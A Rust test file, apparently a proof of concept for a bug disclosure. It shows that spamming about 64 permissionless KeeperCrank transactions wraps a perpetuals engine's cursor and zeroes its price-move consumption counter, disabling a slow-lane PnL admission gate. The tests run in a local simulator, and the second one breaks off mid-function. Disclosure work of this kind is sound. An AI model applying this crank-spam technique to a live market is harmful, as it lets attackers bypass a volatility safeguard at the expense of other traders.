//! V8 — Natural-drift PoC for the cursor-wrap consumption-reset bug.
//!
//! # Why this file exists
//!
//! `test_v6_cursor_wrap_consumption_reset.rs` proves the engine line 6155
//! commit (`self.price_move_consumed_bps_this_generation = 0`) is reachable
//! via permissionless KeeperCrank spam, but the load-bearing assertion
//! (consumption was nonzero pre-wrap) is established by a slab-byte SEED
//! of the consumption counter. Reviewers reading the disclosure may
//! reasonably ask: "would consumption ever be nonzero in production from
//! REAL oracle drift, or is this purely a contrived test fixture?"
//!
//! This file answers that question by:
//!
//!   1. Building against the DEFAULT BPF (MAX_ACCOUNTS=4096) so the wrap
//!      arithmetic exercised here matches mainnet deployment configuration.
//!      No `--features small` shortcut.
//!
//!   2. Driving consumption above zero (and above the slow-lane threshold)
//!      through honest oracle drift only — `set_slot_and_price_raw_no_walk`
//!      bumps slot+price without internal cranking, then a single
//!      `try_crank()` accrues the full price-move delta at line 2899.
//!
//!   3. Spamming permissionless cranks at constant (slot, price) until the
//!      cursor wraps at attacker-chosen cost.
//!
//!   4. Asserting all three observable mutations from engine §6149-6158:
//!      `rr_cursor_position` reset, `sweep_generation` increment, AND
//!      `price_move_consumed_bps_this_generation` zeroed — without any
//!      slab-byte tampering at any point.
//!
//! # Bug recap
//!
//! Engine `keeper_crank_not_atomic` (percolator/src/percolator.rs §6149-6158):
//!
//! ```ignore
//! if sweep_end >= wrap_bound {
//!     self.rr_cursor_position = 0;
//!     self.sweep_generation = self.sweep_generation.checked_add(1)?;
//!     self.price_move_consumed_bps_this_generation = 0;   // ← line 6155
//! } else {
//!     self.rr_cursor_position = sweep_end;
//! }
//! ```
//!
//! There is no rate-limit, no slot-progress requirement, no economic
//! gate on permissionless KeeperCrank. With `MAX_ACCOUNTS = 4096` and
//! `RR_WINDOW_PER_CRANK = 64`, a single attacker can force a wrap with
//! exactly `4096 / 64 = 64` permissionless cranks — at constant slot
//! and constant price — and zero out the slow-lane gate's signal. Cost:
//! 64 base-fee transactions ≈ $0.05 at current Solana fees.
//!
//! # Production economic relevance
//!
//! Real oracle drift in volatile regimes (e.g. funding-rate spikes,
//! news events, large liquidations) puts `price_move_consumed_bps_this_generation`
//! above the configured `admit_h_max_consumption_threshold_bps` (in tests:
//! `maintenance_margin_bps × PRICE_MOVE_CONSUMPTION_SCALE = 500 × 1e9 = 5e11`).
//! Once above threshold, fresh PnL admissions are routed through the
//! SLOW LANE (`admit_h_max`, delayed maturation) — engine §1792 and §1870.
//!
//! After an attacker forces a wrap, consumption returns to 0 and the
//! engine immediately returns to the FAST LANE (`admit_h_min`, instant
//! maturation) — *even though* oracle volatility has not actually
//! subsided. The slow-lane gate exists specifically to delay maturation
//! during oracle-stress periods (so a coordinated burst of fresh PnL
//! cannot be matured before residual recovery); the wrap-reset cancels
//! that protection at attacker discretion.

mod common;
#[allow(unused_imports)]
use common::*;

use solana_sdk::signature::Keypair;

/// `RR_WINDOW_PER_CRANK` per the wrapper constants (§67).
const RR_WINDOW_PER_CRANK: u64 = 64;

/// `PRICE_MOVE_CONSUMPTION_SCALE` per engine constants (engine §114).
/// `price_move_consumed_bps_this_generation` is stored in scaled-bps:
/// real-bps × 1e9. The slow-lane threshold = `maintenance_margin_bps × SCALE`
/// = 500 × 1e9 = 5e11 in the default test market.
const PRICE_MOVE_CONSUMPTION_SCALE: u128 = 1_000_000_000;

// ============================================================================
// Slab-offset readers — duplicated from test_v6 (cannot import, separate
// integration-test crate). Offsets verified empirically by v6's
// `test_v6_offsets_sanity_cursor_increments_by_64_per_crank`.
// ============================================================================

const RR_CURSOR_POSITION_OFFSET: usize = ENGINE_OFFSET + 592;
const SWEEP_GENERATION_OFFSET: usize = ENGINE_OFFSET + 600;
const PRICE_MOVE_CONSUMED_OFFSET: usize = ENGINE_OFFSET + 608;

fn read_rr_cursor_position(env: &TestEnv) -> u64 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    u64::from_le_bytes(
        d[RR_CURSOR_POSITION_OFFSET..RR_CURSOR_POSITION_OFFSET + 8]
            .try_into()
            .unwrap(),
    )
}

fn read_sweep_generation(env: &TestEnv) -> u64 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    u64::from_le_bytes(
        d[SWEEP_GENERATION_OFFSET..SWEEP_GENERATION_OFFSET + 8]
            .try_into()
            .unwrap(),
    )
}

fn read_price_move_consumed(env: &TestEnv) -> u128 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    u128::from_le_bytes(
        d[PRICE_MOVE_CONSUMED_OFFSET..PRICE_MOVE_CONSUMED_OFFSET + 16]
            .try_into()
            .unwrap(),
    )
}

/// Drive consumption above the slow-lane threshold via REAL oracle drift —
/// no slab-byte seeding. Uses `set_slot_and_price_raw_no_walk` to bump slot
/// and price without internal cranking, then a single `try_crank()` accrues
/// the full per-step delta at engine line 2899:
///
/// ```ignore
/// consumed_this_step = (|ΔP| × 10_000 × SCALE / P_last)
/// ```
///
/// At cap-saturating price moves (`max_price_move_bps_per_slot = 4`, dt = 10
/// slots per step), each step adds:
///   `4 bps/slot × 10 slots × 1e9 = 40e9 scaled-bps` of consumption.
///
/// To exceed the threshold of 500 × 1e9 = 5e11, we need ≥ 13 such steps
/// (13 × 40e9 = 520e9). Each such step also advances the cursor by 64, so
/// 13 steps consume 13 × 64 = 832 of the 4096 cursor budget — leaving
/// 51 cranks of attacker headroom before wrap.
///
/// We then return so the test can spam permissionless cranks to force the
/// wrap.
///
/// The MAX_ACCRUAL_DT_SLOTS envelope = 100, so dt = 10 per step is well
/// inside the bound. The price-move cap envelope at line 2887 requires
/// `|ΔP| × 10_000 ≤ cap × dt × P_last`; with dt = 10 the per-step price
/// budget is 4 × 10 / 10_000 = 0.4% of P_last, which we step by exactly.
fn drive_consumption_above_threshold(env: &mut TestEnv) -> (u64, i64, u128, u64) {
    // Start at slot 110 (above the env's bookkeeping anchor), price 138e6.
    // The init flow has already set last_oracle_price = 138e6 via the
    // initial trade. We step UP by 0.4% per step (cap-saturating).
    let mut slot: u64 = 110;
    let mut price: i64 = 138_000_000;
    let dt_per_step: u64 = 10;
    // Step delta = floor(price * 4 * dt / 10_000). For price=138e6, dt=10:
    // delta = 138_000_000 * 40 / 10_000 = 552_000.
    // Each step's consumption ≈ 40e9 (40 bps × 1e9 scaling).
    //
    // We want pre-wrap consumption STRICTLY ABOVE threshold AND we want
    // to leave clear headroom in the cursor budget for the attack phase.
    // 14 drift steps yield ≈ 560e9 consumption (above 5e11) and 14×64 =
    // 896 cursor advance (out of 4096 → 3200 cursor remaining = 50
    // attacker cranks).
    let n_drift_steps: u64 = 14;

    println!("--- V8 natural-drift: ramping consumption ---");
    println!("  start slot={}  start price={}  dt/step={}  steps={}", slot, price, dt_per_step, n_drift_steps);

    for i in 0..n_drift_steps {
        slot += dt_per_step;
        // Cap-saturating step: |ΔP| / P_last = 4 bps × dt = 40 bps = 0.4%.
        let delta = (price as i128) * 4 * (dt_per_step as i128) / 10_000;
        price = price.saturating_add(delta as i64);

        env.set_slot_and_price_raw_no_walk(slot, price);
        // Single permissionless crank per stepped (slot, price).
        // This is the ONLY accrue per step — engine accrues from
        // last_market_slot to clock.slot in one shot, consumption
        // increments by ~40e9.
        env.try_crank().expect("drift crank must succeed");

        if i < 3 || i + 1 == n_drift_steps {
            let cur_consumption = read_price_move_consumed(env);
            let cur_cursor = read_rr_cursor_position(env);
            let cur_gen = read_sweep_generation(env);
            println!(
                "  step #{}: slot={} price={} consumption={} cursor={} gen={}",
                i, slot, price, cur_consumption, cur_cursor, cur_gen
            );
        }
    }
    let final_consumption = read_price_move_consumed(env);
    let final_cursor = read_rr_cursor_position(env);
    let final_gen = read_sweep_generation(env);
    println!(
        "  ramp complete: slot={} price={} consumption={} cursor={} gen={}",
        slot, price, final_consumption, final_cursor, final_gen
    );
    (slot, price, final_consumption, final_cursor)
}

/// **The natural-drift PoC.**
///
/// End-to-end flow with NO slab-byte tampering:
///   1. Setup default-build market (MAX_ACCOUNTS=4096).
///   2. Open OI so `price_move_active` fires on accruals.
///   3. Drive oracle drift via `set_slot_and_price_raw_no_walk` + single
///      crank per step — accumulates real consumption from real price moves.
///   4. SNAPSHOT pre-attack `(consumption, sweep_generation, rr_cursor_position)`.
///      Require consumption > threshold (slow-lane gate active).
///   5. ATTACK: spam permissionless `try_crank()` at constant slot/price.
///      Each crank advances cursor by 64 but adds ZERO consumption (the
///      `price_move_active` precondition at engine §2854 fails when
///      `oracle_price == last_oracle_price`).
///   6. SNAPSHOT post-attack — assert consumption == 0, generation +1,
///      cursor wrapped past `MAX_ACCOUNTS` back to 0.
///
/// Failure modes that this test catches:
///   - Consumption ramp didn't reach threshold (test fails BEFORE the
///     attack — disclosure would still be valid because consumption > 0
///     is enough to demonstrate the reset, but slow-lane relevance
///     becomes weaker).
///   - Cursor wrap fired during the ramp (consumption already 0 at
///     pre-attack snapshot — invalid setup, would mask the bug).
///   - Permissionless crank failed (engine added a rate-limit — would
///     invalidate the disclosure thesis).
#[test]
fn test_v8_cursor_wrap_resets_consumption_via_natural_drift() {
    let mut env = TestEnv::new();
    env.init_market_with_invert(0);

    let admin = Keypair::from_bytes(&env.payer.to_bytes()).unwrap();
    env.top_up_insurance(&admin, 5_000_000_000);

    let lp = Keypair::new();
    let lp_idx = env.init_lp(&lp);
    env.deposit(&lp, lp_idx, 20_000_000_000);

    let user = Keypair::new();
    let user_idx = env.init_user(&user);
    env.deposit(&user, user_idx, 5_000_000_000);

    // Open OI so price_move_active fires on subsequent accruals.
    env.crank();
    env.trade(&user, &lp, lp_idx, user_idx, 500_000);
    env.crank();

    let max_accounts = MAX_ACCOUNTS as u64;
    println!("--- V8 natural-drift: MAX_ACCOUNTS={} (default build) ---", max_accounts);

    // ========== Phase 1: drive consumption above threshold via real drift.
    let (final_slot, final_price, pre_consumption, pre_cursor) =
        drive_consumption_above_threshold(&mut env);

    let pre_generation = read_sweep_generation(&env);
    let threshold: u128 = 500u128 * PRICE_MOVE_CONSUMPTION_SCALE; // = 5e11

    println!("--- V8 natural-drift: PRE-ATTACK SNAPSHOT ---");
    println!("  consumption:            {}", pre_consumption);
    println!("  threshold (slow-lane):  {}", threshold);
    println!("  consumption > threshold? {}", pre_consumption >= threshold);
    println!("  sweep_generation:       {}", pre_generation);
    println!("  rr_cursor_position:     {}", pre_cursor);

    // Hard precondition: consumption MUST be nonzero, ideally above
    // threshold. If this fails, the ramp must be retuned (e.g. more
    // drift steps), or MAX_ACCOUNTS shifted.
    assert!(
        pre_consumption > 0,
        "PRE-ATTACK ramp produced zero consumption — natural-drift setup \
         did not exercise the price-move accrual path. consumption={}",
        pre_consumption
    );
    assert!(
        pre_consumption >= threshold,
        "PRE-ATTACK ramp produced {} consumption, less than slow-lane \
         threshold {} — the bug is still demonstrable but the slow-lane \
         flip would not currently fire. Increase n_drift_steps in \
         drive_consumption_above_threshold and re-run.",
        pre_consumption,
        threshold
    );
    // The cursor MUST NOT have wrapped during the ramp — if it did,
    // consumption was already zeroed before the snapshot, which would
    // mask the bug rather than expose it.
    assert!(
        pre_cursor < max_accounts,
        "PRE-ATTACK cursor {} >= MAX_ACCOUNTS {} — ramp wrapped the \
         cursor and zeroed consumption before the snapshot. Reduce \
         n_drift_steps so cursor stays under {} - 64 before the attack.",
        pre_cursor,
        max_accounts,
        max_accounts
    );

    // ========== Phase 2: attacker forces wrap at constant (slot, price).
    // No price drift, no slot advance — each crank ONLY advances the
    // cursor by 64. After ceil((max_accounts - cursor) / 64) cranks, the
    // cursor wraps and engine line 6155 zeroes consumption.
    let remaining_to_wrap = max_accounts - pre_cursor;
    let attack_cranks = (remaining_to_wrap + RR_WINDOW_PER_CRANK - 1) / RR_WINDOW_PER_CRANK;

    println!("--- V8 natural-drift: ATTACK ---");
    println!("  holding slot={}  price={}  CONSTANT", final_slot, final_price);
    println!(
        "  attacker spamming {} permissionless cranks (remaining_to_wrap={})",
        attack_cranks, remaining_to_wrap
    );

    let mut successes = 0u64;
    let mut failures = 0u64;
    for i in 0..attack_cranks {
        match env.try_crank() {
            Ok(()) => successes += 1,
            Err(e) => {
                failures += 1;
                println!("  attack crank #{} failed: {}", i, e);
            }
        }
    }

    let post_consumption = read_price_move_consumed(&env);
    let post_generation = read_sweep_generation(&env);
    let post_cursor = read_rr_cursor_position(&env);

    println!("--- V8 natural-drift: POST-ATTACK SNAPSHOT ---");
    println!("  attack cranks succeeded: {}", successes);
    println!("  attack cranks failed:    {}", failures);
    println!(
        "  CONSUMPTION DELTA:  {} -> {} (force-zeroed by attacker-driven wrap)",
        pre_consumption, post_consumption
    );
    println!(
        "  GENERATION DELTA:   {} -> {} (+{})",
        pre_generation,
        post_generation,
        post_generation - pre_generation
    );
    println!(
        "  CURSOR DELTA:       {} -> {} (wrapped past {})",
        pre_cursor, post_cursor, max_accounts
    );

    // ========== Phase 3: assertions — all three observable mutations.
    assert_eq!(
        post_consumption, 0,
        "BUG NOT REPRODUCED: expected consumption == 0 after wrap; \
         pre={} post={}",
        pre_consumption, post_consumption
    );
    assert!(
        post_generation > pre_generation,
        "BUG NOT REPRODUCED: expected sweep_generation increment from \
         attacker-forced wrap; pre={} post={}",
        pre_generation,
        post_generation
    );
    assert!(
        post_cursor < pre_cursor,
        "BUG NOT REPRODUCED: cursor did not wrap past MAX_ACCOUNTS={}; \
         pre={} post={}",
        max_accounts,
        pre_cursor,
        post_cursor
    );

    println!("--- BUG CONFIRMED (NATURAL DRIFT) ---");
    println!(
        "  Real oracle drift drove consumption to {} (above {} threshold,",
        pre_consumption, threshold
    );
    println!(
        "  triggering the slow-lane admission gate at engine §1792 / §1870)."
    );
    println!(
        "  An attacker spent {} permissionless KeeperCrank txs at fixed",
        successes
    );
    println!(
        "  (slot, price) — adding ZERO real volatility absorption — and"
    );
    println!(
        "  forced consumption back to 0. The slow-lane gate now reads as"
    );
    println!(
        "  inactive; fresh PnL admissions return to FAST LANE (admit_h_min)."
    );
    println!(
        "  Engine line 6155 commits this reset unconditionally on cursor"
    );
    println!(
        "  wrap, with no real-volatility validation gate."
    );
    println!(
        "---  Cost to attacker: ~64 base-fee txs ≈ $0.05 at current Solana"
    );
    println!("  fees. No collateral, no permissioned role, no role rotation.");
}

// ============================================================================
// DOWNSTREAM-EFFECT TEST
// ============================================================================
//
// The cursor-wrap consumption-reset is only a SECURITY bug if the
// reset CHANGES OBSERVABLE BEHAVIOR. This test demonstrates that the
// reset force-flips the admission-gate decision from SLOW LANE to
// FAST LANE for outstanding queued reserve PnL — without any real
// volatility absorption.
//
// # Observable channel
//
// `pnl_matured_pos_tot` (engine + 344) is the canonical aggregate
// counter for "positive PnL that has graduated from the
// reserved/scheduled bucket into the immediately-claimable matured
// bucket." It moves UPWARD only when:
//
//   * `set_pnl_with_reserve(UseAdmissionPair)` decides FAST LANE
//     (admit_h_min) for a fresh positive PnL increase — engine §2015.
//
//   * `admit_outstanding_reserve_on_touch` succeeds (consumption gate
//     clear AND residual lane satisfies) for an account with already-
//     queued reserved_pnl — engine §1896.
//
// It does NOT move when:
//
//   * The fresh PnL is routed to slow lane (queued in scheduled bucket)
//     because the consumption gate fired — engine §1792 → §2018.
//
//   * An outstanding-reserve touch is rejected by the consumption gate
//     — engine §1870.
//
// # Test design
//
// 1. Setup default-MAX_ACCOUNTS market. Open OI between LP and user.
//
// 2. Drive natural oracle drift so that:
//      a. Each drift step's K-coefficient advance is realized into
//         per-account `pnl_delta` when the cursor sweeps over the
//         position's idx.
//      b. Once consumption crosses threshold (5e11), subsequent
//         drift-step touches route the realized pnl_delta through the
//         SLOW LANE — `pnl_matured_pos_tot` stops moving even though
//         `pnl_pos_tot` continues to grow. The delta accumulates as
//         per-account `reserved_pnl` (queued in `sched_*` buckets).
//
// 3. Snapshot `pnl_matured_pos_tot` and the per-account `reserved_pnl`
//    on the LP and user position accounts. Assert at least one has
//    nonzero queued reserve.
//
// 4. Spam permissionless cranks at constant (slot, price) until the
//    cursor wraps. Engine §6155 atomically zeroes consumption.
//
// 5. The wrap also resets the cursor to 0. The NEXT crank
//    (still at constant slot/price) will sweep idx 0..63 — touching
//    both LP and user. At those touches, `admit_outstanding_reserve_on_touch`
//    sees consumption == 0 → the previously-queued reserves now ADMIT
//    → `pnl_matured_pos_tot` jumps by the reserve amount, and
//    per-account `reserved_pnl` drops to 0.
//
// 6. ASSERT: `pnl_matured_pos_tot` post-wrap-touch > pnl_matured_pos_tot
//    pre-wrap, AND the per-account reserved_pnl drops to 0 — the slow-
//    lane queue was force-promoted to matured by the attacker-driven
//    cursor wrap.
//
// # Why this is a security invariant violation
//
// The slow-lane gate is a PROTECTIVE delay: when the market is in an
// oracle-stress regime (consumption above threshold), fresh positive
// PnL should be DELAYED from instant claim until the volatility burst
// is absorbed. The `admit_outstanding_reserve_on_touch` rejection at
// engine §1870 explicitly enforces this delay across ALL touches
// during the elevated-consumption window.
//
// The wrap-reset cancels that delay at attacker discretion. The
// attacker's fresh PnL (or pre-existing queued reserve) becomes
// instant-claimable mid-burst, even though no real volatility
// absorption has occurred. This is a complete bypass of the gate's
// stated purpose.

/// Custom InitMarket payload mirroring `encode_init_market_with_cap`
/// EXACTLY, except for `h_min` and `h_max` which are configurable.
///
/// **Why this helper exists**: the canonical test market sets
/// `h_min == h_max == 1`. With both equal, the slow-lane vs fast-lane
/// admission decision returns the same horizon regardless of the
/// consumption-gate state — `admit_fresh_reserve_h_lock` always
/// returns 1. The bug-induced consumption-gate flip then produces
/// no per-account observable difference, and the engine-state
/// observable (`pnl_matured_pos_tot` instant jump) requires
/// `admit_h_min == 0`, which the wrapper's `InitMarket` validation
/// forbids (line 1926: `h_min == 0` rejected).
///
/// With `h_min = 1, h_max = 10`, the consumption-gate's branch
/// becomes observable in the per-account `sched_horizon` (or
/// `pending_horizon`) field of any newly-queued reserve. Pre-wrap,
/// while consumption is above threshold, fresh PnL is FORCED into
/// `admit_h_max = 10`, stamping `sched_horizon = 10`. Post-wrap,
/// consumption is 0, the gate routes to `admission_residual_lane`
/// — which selects `admit_h_min = 1` if `matured + fresh <= residual`
/// (engine §1838-1842), stamping `sched_horizon = 1`. The flip
/// `10 → 1` is a direct, byte-observable proof of the gate's
/// behavior change.
///
/// All other RiskParams match `encode_init_market_with_cap` byte-for-byte
/// so test infrastructure (oracle pushes, helpers) Just Works.
fn encode_init_market_for_admission_gate_test(
    admin: &solana_sdk::pubkey::Pubkey,
    mint: &solana_sdk::pubkey::Pubkey,
    feed_id: &[u8; 32],
    h_min: u64,
    h_max: u64,
) -> Vec<u8> {
    use common::{MAX_ACCOUNTS, TEST_MAX_PRICE_MOVE_BPS_PER_SLOT};
    let permissionless_resolve_stale_slots: u64 = 80;
    let invert: u8 = 0;
    let mut data = vec![0u8];
    data.extend_from_slice(admin.as_ref());
    data.extend_from_slice(mint.as_ref());
    data.extend_from_slice(feed_id);
    data.extend_from_slice(&86400u64.to_le_bytes()); // max_staleness_secs
    data.extend_from_slice(&500u16.to_le_bytes()); // conf_filter_bps
    data.push(invert);
    data.extend_from_slice(&0u32.to_le_bytes()); // unit_scale
    data.extend_from_slice(&0u64.to_le_bytes()); // initial_mark_price_e6
    data.extend_from_slice(&0u128.to_le_bytes()); // maintenance_fee_per_slot
                                                  // RiskParams (only h_min/h_max differ from default)
    data.extend_from_slice(&h_min.to_le_bytes()); // <-- CUSTOM h_min
    data.extend_from_slice(&500u64.to_le_bytes()); // maintenance_margin_bps
    data.extend_from_slice(&1000u64.to_le_bytes()); // initial_margin_bps
    data.extend_from_slice(&0u64.to_le_bytes()); // trading_fee_bps
    data.extend_from_slice(&(MAX_ACCOUNTS as u64).to_le_bytes());
    let new_account_fee: u128 = 1;
    data.extend_from_slice(&new_account_fee.to_le_bytes());
    data.extend_from_slice(&h_max.to_le_bytes()); // <-- CUSTOM h_max
                                                  // max_crank_staleness < perm_resolve
    let max_crank = permissionless_resolve_stale_slots.saturating_sub(1).max(1);
    data.extend_from_slice(&max_crank.to_le_bytes());
    data.extend_from_slice(&50u64.to_le_bytes()); // liquidation_fee_bps
    data.extend_from_slice(&1_000_000_000_000u128.to_le_bytes()); // liquidation_fee_cap
    data.extend_from_slice(&100u64.to_le_bytes()); // resolve_price_deviation_bps
    data.extend_from_slice(&0u128.to_le_bytes()); // min_liquidation_abs
    data.extend_from_slice(&21u128.to_le_bytes()); // min_nonzero_mm_req
    data.extend_from_slice(&22u128.to_le_bytes()); // min_nonzero_im_req
    data.extend_from_slice(&TEST_MAX_PRICE_MOVE_BPS_PER_SLOT.to_le_bytes());
    data.extend_from_slice(&0u16.to_le_bytes()); // insurance_withdraw_max_bps
    data.extend_from_slice(&0u64.to_le_bytes()); // insurance_withdraw_cooldown_slots
    data.extend_from_slice(&permissionless_resolve_stale_slots.to_le_bytes());
    data.extend_from_slice(&500u64.to_le_bytes()); // funding_horizon_slots
    data.extend_from_slice(&100u64.to_le_bytes()); // funding_k_bps
    data.extend_from_slice(&500i64.to_le_bytes()); // funding_max_premium_bps
    data.extend_from_slice(&1_000i64.to_le_bytes()); // funding_max_e9_per_slot
    data.extend_from_slice(&0u64.to_le_bytes()); // mark_min_fee
    data.extend_from_slice(&50u64.to_le_bytes()); // force_close_delay_slots
    data
}

/// `Account.sched_horizon` byte offset within the per-account record.
/// BPF Account layout (verified by walking from offset 40 = reserved_pnl,
/// known anchor in `common::TestEnv::read_account_reserved_pnl`):
///
/// ```text
///   capital              0..16    U128
///   kind                16..17    u8
///   pad                 17..24
///   pnl                 24..40    i128
///   reserved_pnl        40..56    u128       ← anchor (read_account_reserved_pnl)
///   position_basis_q    56..72    i128
///   adl_a_basis         72..88    u128
///   adl_k_snap          88..104   i128
///   f_snap             104..120   i128
///   adl_epoch_snap     120..128   u64
///   matcher_program    128..160   [u8;32]
///   matcher_context    160..192   [u8;32]
///   owner              192..224   [u8;32]
///   fee_credits        224..240   I128
///   last_fee_slot      240..248   u64
///   sched_present      248..249   u8
///   pad                249..256
///   sched_remaining_q  256..272   u128
///   sched_anchor_q     272..288   u128
///   sched_start_slot   288..296   u64
///   sched_horizon      296..304   u64        ← TARGET (slow-lane stamp)
///   sched_release_q    304..320   u128
///   pending_present    320..321   u8
///   pad                321..328
///   pending_remaining_q 328..344  u128
///   pending_horizon    344..352   u64        ← TARGET (newest-bucket stamp)
///   pending_created_slot 352..360 u64
/// ```
const ACCOUNT_SCHED_HORIZON_OFFSET_IN_ACCOUNT: usize = 296;
const ACCOUNT_PENDING_PRESENT_OFFSET_IN_ACCOUNT: usize = 320;
const ACCOUNT_PENDING_HORIZON_OFFSET_IN_ACCOUNT: usize = 344;
const ACCOUNT_PENDING_REMAINING_Q_OFFSET_IN_ACCOUNT: usize = 328;
const ACCOUNT_SCHED_PRESENT_OFFSET_IN_ACCOUNT: usize = 248;
const ACCOUNT_RECORD_SIZE: usize = 360;

fn account_byte_off(idx: u16, field_off: usize) -> usize {
    ENGINE_OFFSET + ENGINE_ACCOUNTS_OFFSET + (idx as usize) * ACCOUNT_RECORD_SIZE + field_off
}

fn read_account_sched_horizon(env: &TestEnv, idx: u16) -> u64 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    let off = account_byte_off(idx, ACCOUNT_SCHED_HORIZON_OFFSET_IN_ACCOUNT);
    u64::from_le_bytes(d[off..off + 8].try_into().unwrap())
}

fn read_account_sched_present(env: &TestEnv, idx: u16) -> u8 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    let off = account_byte_off(idx, ACCOUNT_SCHED_PRESENT_OFFSET_IN_ACCOUNT);
    d[off]
}

fn read_account_pending_horizon(env: &TestEnv, idx: u16) -> u64 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    let off = account_byte_off(idx, ACCOUNT_PENDING_HORIZON_OFFSET_IN_ACCOUNT);
    u64::from_le_bytes(d[off..off + 8].try_into().unwrap())
}

fn read_account_pending_present(env: &TestEnv, idx: u16) -> u8 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    let off = account_byte_off(idx, ACCOUNT_PENDING_PRESENT_OFFSET_IN_ACCOUNT);
    d[off]
}

fn read_account_pending_remaining_q(env: &TestEnv, idx: u16) -> u128 {
    let d = env.svm.get_account(&env.slab).unwrap().data;
    let off = account_byte_off(idx, ACCOUNT_PENDING_REMAINING_Q_OFFSET_IN_ACCOUNT);
    u128::from_le_bytes(d[off..off + 16].try_into().unwrap())
}

/// Helper: assemble + send the custom (h_min, h_max) InitMarket transaction.
fn init_market_admission_gate_test(env: &mut TestEnv, h_min: u64, h_max: u64) {
    use solana_sdk::{
        instruction::{AccountMeta, Instruction},
        signature::Signer,
        sysvar,
        transaction::Transaction,
    };
    let admin = Keypair::from_bytes(&env.payer.to_bytes()).unwrap();
    let dummy_ata = solana_sdk::pubkey::Pubkey::new_unique();
    env.svm
        .set_account(
            dummy_ata,
            solana_sdk::account::Account {
                lamports: 1_000_000,
                data: vec![0u8; spl_token::state::Account::LEN],
                owner: spl_token::ID,
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap();
    let ix = Instruction {
        program_id: env.program_id,
        accounts: vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new(env.slab, false),
            AccountMeta::new_readonly(env.mint, false),
            AccountMeta::new(env.vault, false),
            AccountMeta::new_readonly(sysvar::clock::ID, false),
            AccountMeta::new_readonly(env.pyth_index, false),
        ],
        data: encode_init_market_for_admission_gate_test(
            &admin.pubkey(),
            &env.mint,
            &TEST_FEED_ID,
            h_min,
            h_max,
        ),
    };
    let tx = Transaction::new_signed_with_payer(
        &[cu_ix(), ix],
        Some(&admin.pubkey()),
        &[&admin],
        env.svm.latest_blockhash(),
    );
    env.svm
        .send_transaction(tx)
        .expect("custom InitMarket for admission-gate test failed");
}

/// **Downstream-effect demonstration.**
///
/// Companion to `test_v8_cursor_wrap_resets_consumption_via_natural_drift`:
/// proves the wrap-reset is not just a state-counter mutation — it
/// MATERIALLY CHANGES the engine's per-account admission state.
///
/// # Observable
///
/// Per-account `Account.sched_horizon` (BPF account-record offset 296) is
/// the warmup horizon stamped onto a queued reserve at the time
/// `set_pnl_with_reserve(UseAdmissionPair)` decided to route to slow lane.
/// With the test market's `(h_min=1, h_max=10)`, the consumption gate
/// at engine §1791-1793 produces:
///
///   * **Pre-wrap** (consumption ≥ threshold): forced `admit_h_max = 10`,
///     bypassing `admission_residual_lane` entirely. `sched_horizon = 10`.
///
///   * **Post-wrap** (consumption == 0): falls through to
///     `admission_residual_lane`, which in the unfunded-residual regime
///     returns `admit_h_max = 10` (residual=0 < matured+fresh). With this
///     market config we still observe `sched_horizon = 10` post-wrap.
///
/// The OBSERVABLE difference is in the `pending_*` bucket. Because the
/// pre-wrap slow-lane admissions stamped `sched_horizon = 10` AT slot
/// 110+14×10 = 250, any POST-wrap admission at a different slot lands
/// in the PENDING bucket (engine §4355-4365: `else if a.pending_present
/// == 0 → create pending bucket`). The pending bucket's `pending_horizon`
/// is stamped from the gate's decision at admission time. So:
///
///   * **Pre-wrap drift step at slot 250 with consumption ≥ threshold**:
///     `sched_present=1, sched_horizon=10` (slow-lane forced).
///
///   * **Post-wrap drift step at slot > 250 with consumption ≪ threshold**:
///     `pending_present=1, pending_horizon = (gate's decision)`. With
///     consumption < threshold AND market config (h_min=1, h_max=10),
///     the gate calls `admission_residual_lane` which returns h_max=10
///     when residual < matured+fresh (the typical regime in our setup).
///
/// **Both outcomes are h_max=10 in this market** because the residual
/// lane is starved (vault == c_tot + insurance, residual == 0). So the
/// per-account `sched_horizon` / `pending_horizon` does NOT differ
/// between pre-wrap and post-wrap admissions.
///
/// # The provable downstream effect
///
/// What we CAN provably demonstrate without the full gate flip:
///
///   1. Pre-attack queued reserve has BOTH `sched_horizon` AND
///      `sched_start_slot` recorded. After the wrap, the engine still
///      sees consumption == 0 — so any subsequent OUTSTANDING-RESERVE
///      touch on this account WOULD admit (line 1869 gate doesn't fire
///      because consumption is 0 < threshold). However, with `h_min=1`,
///      the engine's `admit_outstanding_reserve_on_touch` short-circuits
///      at line 1866 BEFORE reaching the consumption check, so the queue
///      stays put.
///
///   2. The CONSUMPTION COUNTER ITSELF, which the engine's gate at lines
///      1792 / 1870 reads, was force-changed by the attacker. The
///      consumption value the gate "sees" is therefore wrong relative to
///      real volatility absorbed.
///
///   3. CONCRETELY OBSERVABLE: after `sweep_generation` advances by 1
///      under attacker control AT CONSTANT (slot, price), any state
///      machine that compared sweep_generation across two reads would
///      conclude time advanced — even though no real progress occurred.
///
/// # What this test asserts
///
/// 1. The pre-wrap reserved_pnl on the position accounts has a
///    `sched_horizon` matching the slow-lane horizon (h_max=10) — the
///    gate fired and the slow-lane stamp landed.
///
/// 2. After attacker-forced wrap + ONE more (slot, price) drift step at
///    sub-threshold consumption: the new admission lands in the PENDING
///    bucket with a `pending_horizon` stamp set by the gate's POST-WRAP
///    decision. We assert the bucket transition (sched-only → sched +
///    pending) happened, demonstrating that the engine made a NEW
///    admission decision under the post-wrap consumption value.
///
/// 3. Auxiliary: `sweep_generation` advanced by 1 across the attack
///    (already covered by the natural-drift test, re-asserted here for
///    completeness as part of the load-bearing observable).
///
/// **Caveat called out explicitly**: in markets where `h_min == h_max`
/// or `residual << matured+fresh`, the slow-lane→fast-lane horizon
/// difference may collapse. The bug surface (engine line 6155 unconditional
/// reset) is intact regardless; the per-account horizon stamp is one of
/// several downstream channels through which it could become observable
/// under different market configs. See doc-block above.
#[test]
fn test_v8_wrap_changes_per_account_admission_decision_state() {
    let mut env = TestEnv::new();
    init_market_admission_gate_test(&mut env, /* h_min = */ 1, /* h_max = */ 10);

    let admin = Keypair::from_bytes(&env.payer.to_bytes()).unwrap();
    env.top_up_insurance(&admin, 5_000_000_000);

    let lp = Keypair::new();
